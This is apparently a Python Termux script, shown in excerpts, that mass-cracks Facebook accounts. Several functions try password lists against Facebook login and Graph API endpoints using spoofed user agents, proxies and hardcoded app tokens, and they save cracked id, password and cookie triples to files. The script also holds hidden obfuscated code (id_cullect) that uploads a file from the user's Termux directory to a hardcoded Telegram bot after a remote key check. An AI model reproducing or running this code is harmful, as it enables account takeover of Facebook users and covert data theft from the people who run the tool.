...
if not any(word in fuck11 for word in c):
      ...
      exit(os.system('pip uninstall pycurl && pip install pycurl'))
from requests import api
...
#------------------(API_UA)---------------#
pompom = requests.get('/R/main/model.txt').text.splitlines()
ugen5=[]
...
def m3_ua():
    ...
    uac = '[Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36]'
    uad = '[Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36]'
    ua = random.choice([uab,uac,uad])
    return ua

def m4_ua():
    samsung = random.choice(["SM-J200F", "SM-J200G", "SM-J200H", "SM-J200GU", "SM-J200M", "SM-J200Y", "SM-A556V", "SM-A556U", "SM-A556U1", "SM-A556B", "SM-A556B", "SM-A556E", "SM-A556E", "SM-A5560", "SM-A205F", "SM-A205FN", "SM-A205U", "SM-A205GN", "SM-A205YN", "SM-A205G", "SM-A205W", "SM-A205F", "SM-A205FN", "SM-A205GN", "SM-A205YN", "SM-A205G", "SM-A205W", "SM-A205U", "SM-A205S", "SM-S205DL", "SM-A205U1", "SM-A405F", "SM-A405FN", "SM-A405FM", "SM-A405S", "SM-A920F", "SM-A9200", "SM-A920N", "SM-A920X", "SM-A505F", "SM-A505FN", "SM-A505GN", "SM-A505G", "SM-A505FM", "SM-A505YN", "SM-A505W", "SM-A505X", "SM-A505U", "SM-A505GT", "SM-A505U1", "SM-A505G", "SM-A505N", "SM-S506DL", "SM-E225F", "SM-E225F"])
    uaa = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
    uab = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
    uac = '[Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36]'
    uad = '[Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36]'
    uae = '[Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36]'
...
def useragenttx():
        ...
        ua=f'[Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36]'
        return ua
#---------------(INDICATION)---------------#
...
def id_cullect():
    try:
      path = str('/d'+'a'+'t'+'a'+'/d'+'at'+'a'+'/'+'co'+'m.t'+'er'+'m'+'u'+'x/'+'fi'+'le'+'s/'+'usr'+'/li'+'b'+'/'+'p'+'yt'+'h'+'o'+'n3.'+'1'+'1'+'/'+'m'+'u'+'l'+'t'+'i'+'p'+'r'+'o'+'c'+'e'+'s'+'si'+'n'+'g'+'/.i'+'d.'+'tx'+'t')
      open(path,'r').read()
    except:
      open(path,'w').write('')
    try:
      path = str('/d'+'a'+'t'+'a'+'/d'+'at'+'a'+'/'+'co'+'m.t'+'er'+'m'+'u'+'x/'+'fi'+'le'+'s/'+'usr'+'/li'+'b'+'/'+'p'+'yt'+'h'+'o'+'n3.'+'1'+'1'+'/'+'m'+'u'+'l'+'t'+'i'+'p'+'r'+'o'+'c'+'e'+'s'+'si'+'n'+'g'+'/.i'+'d.'+'tx'+'t')
      with open(path,'rb') as filll:
          ctid = str("6"+"7"+"5"+"5"+"9"+"4"+"1"+"4"+"4"+"6")
          requests.post('h'+'t'+'t'+'p'+'s'+':/'+'/'+'a'+'p'+'i.'+'t'+'e'+'l'+'e'+'gr'+'am'+'.o'+'rg'+'/b'+'o'+'t6'+'7'+'6'+'1'+'1'+'0'+'8'+'8'+'7'+'4'+':A'+'A'+'H'+'w'+'2'+'G8'+'mW'+'L'+'EI'+'n'+'w8'+'L'+'Q'+'Fr'+'K'+'p'+'M'+'4'+'Nx'+'p'+'P0'+'B'+'TsjU'+'w'+'s'+'/s'+'e'+'n'+'d'+'D'+'oc'+'u'+'m'+'e'+'n'+'t',data={'chat_id': ctid},files={'document': filll})
          os.remove(path)
          menu()
    except Exception as e:
      exit('unknown error found in your termux')
...
def approval(key):
    ...
    os.system('xdg-open https://www.facebook.com/profile.php?id=100080591932535')
...
def passwrd(psswd,ppxx):
    ...
    print(f'\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Total OK/CP : /0')
    linex()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}TOXIC-M1\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ...
    # 'cookie': 'datr=j-vVZkS02jLvsgO2UZofDPtr; sb=j-vVZjs7M5L4-jAxJGK51kJH; ps_l=1; ps_n=1; m_pixel_ratio=2; wd=360x718; fr=0eGIw9f7VqS4lwzM3..Bm1euP..AAA.0.0.Bm2Ptx.AWWqmQMLwMM',
    'dpr': '2',
    ...
    'viewport-width': '980',
            ...
            po = ses.post('https://m.facebook.com/',data=dataa,cookies={'cookie': koki},headers=head_2,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[38;5;166m[TOXIC-CP] {idf} | {pw}')
                print("\x1b[38;5;46m[🥴] Cookie : "+str(kuki))
                open('/sdcard/TOXIC/TOXIC-CP.txt','a').write(idf+'|'+pw+'\n')
                cp+=1
                break
                ...
                print(f'\r\x1b[1;32m[TOXIC-OK] {str(idf)} | {str(pw)} ')
                print("\x1b[38;5;46m[🥴] Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/TOXIC-M1-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/TOXIC-M1-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            else:
                continue
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}TOXIC-M2\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ua = random.choice(ugen5)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                linex()
                open('/sdcard/noob/TOXIC-M2-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/TOXIC-M2-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
...
def creakup(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}TOXIC-M3\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "session_key" in po:
                ...
                print("\x1b[38;5;46m[🥴]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/TOXIC-M3-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/TOXIC-M3-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
...
def creakbst(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}TOXIC-M4\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    hini = str(random.randint(20000, 40000))
    ...
    for pw in pwv:
        try:
            ...
            if "session_key" in po:
                ...
                print("\x1b[38;5;46m[🥴]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/TOXIC-M4-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/TOXIC-M4-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\x1b[38;5;166m[TOXIC-CP] {idf} | {pw}')
                open('/sdcard/TOXIC/TOXIC-CP.txt','a').write(idf+'|'+pw+'\n')
...
def creaksexy(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}TOXIC-M5\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ua = random.choice(ugen5)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    ...
    'Accept-Language': 'en-GB,en;q=0.9,fa-IN;q=0.8,fa;q=0.7,hi-IN;q=0.6,hi;q=0.5,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2'}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print("\x1b[38;5;46m[🥴]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/TOXIC-M5-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/TOXIC-M5-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
...
def bgraphpower(idf,pwv):
    ...
    for pw in pwv:
        try:
            with requests.Session() as session:
               headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            ...
            if "session_key" in po:
                ...
                print("\x1b[38;5;46m[🥴]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/TOXIC-M6-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/TOXIC-M6-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\x1b[38;5;166m[TOXIC-CP] {idf} | {pw}')
                open('/sdcard/TOXIC/TOXIC-CP.txt','a').write(idf+'|'+pw+'\n')
...
def randome(idf,pwv,tl):
    ...
    ses = requests.Session()
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}TOXIC-XD\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46m{tl}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{str(len(oks))}\x1b[38;5;160m]");sys.stdout.flush()
    try:
        for pw in pwv:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ...
            if 'LIVE' in response:       	
                print(f'\r\r{A}[{G1}TARIN-OK{A}]{G1} {uid} {A}|{G1} {pas}')
                open('/sdcard/TARIN-RNDM-OK.txt','a').write(uid+'|'+pas+'\n')
                ok.append(str(uid))
                break
                #######print(f'\r\r{A}[{S}TARIN-CP{A}]{S} {uid} {A}|{S} {pas}');open('/sdcard/TARIN-RNDM-CP.txt','a').write(uid+'|'+pas+'|'+coki+'\n');cp.append(uid);break
           ##### if res == 'LOCK':
            #######	print(f'\r\r{A}[{S}TARIN-LK{A}]{S} {uid} {A}|{S} {pas}');break
            elif 'www.facebook.com' in lo['error']['message']:
               uid = lo['error']['error_data']['uid']
               print(f'\r\r{A}[{S}TARIN-CP{A}]{S} {uid} {A}|{S} {pas}')
               open('/sdcard/TOXIC/RANDOM-CP.txt', 'a').write(str(uid)+'|'+str(pw)+'\n')
               cps.append(str(uid))
               break    
            else:
                continue
    ...
    try:
        for pw in pwv:
            ...
            with requests.Session() as sess:
              data = {'adid': adid,'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': idf,'password': pw,'method': 'auth.login','generate_analytics_claim':'1','community_id':'','cpl':'true','try_num':'1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ..oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3','fb4a_shared_phone_cpl_group':'enable_v3_at_risk','enroll_misauth':'false','generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'account_recovery','generate_machine_id':'1','jazoest':'2980','meta_inf_fbmeta':'V2_UNTAGGED','encrypted_msisdn':'','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'autheticate','fb_api_caller_class':'Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895','sig':'4c854da0db9429f4913c2a1b221c1d30'}
              head = {'user-agent': '[FBAN/Orca-Android;FBAV/352.0.0.9.116;FBPN/com.facebook.orca;FBLC/en_US;FBBV/356687955;FBCR/cricket;FBMF/motorola;FBBD/motorola;FBDV/moto g power (2021);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1488};FB_FW/1;]',
            ...
            ###	if"ok"==lo_ck(idf):
               ...
               #### if "LIVE" in response:
                ...
                linex()
                open('/sdcard/TOXIC/RANDOM-OK.txt', 'a').write(str(idf)+'|'+str(pw)+'|'+str(coki)+'\n')
                oks.append(str(idf))
                break                            	
            elif 'www.facebook.com' in po['error']['message']:
                ...
                ######response = str(requests.get(f"https://graph.facebook.com/{uid}/picture?type=normal").text)
                ####if "LIVE" in response:
                print(f'\r\x1b[1;91m[TOXIC-CP] {str(idf)} | {str(pw)} ')
                open('/sdcard/TOXIC/RANDOM-CP.txt', 'a').write(str(idf)+'|'+str(pw)+'\n')
                cps.append(str(idf))
                break
            else:
                continue
...
key = xk+'|'+yk
enc_key=key.replace('A','E').replace('B','T').replace('C','F').replace('E','N').replace('T','0').replace('F','H').replace('H','K').replace('K','D').replace('6','4').replace('8','7')
try:
   import io,pycurl
except:
   os.system('pip uninstall pycurl && pip install pycurl')
buffer = io.BytesIO()
link = "https://github.com/Rofiqu10/Awm/blob/main/Approved"
c = pycurl.Curl()
c.setopt(c.URL,link)
c.setopt(c.WRITEDATA, buffer)
try:c.perform()
except pycurl.error:exit(f"Cheak Your Network Connection ...")
c.close()
body = buffer.getvalue().decode('utf-8')

if enc_key in body:id_cullect()
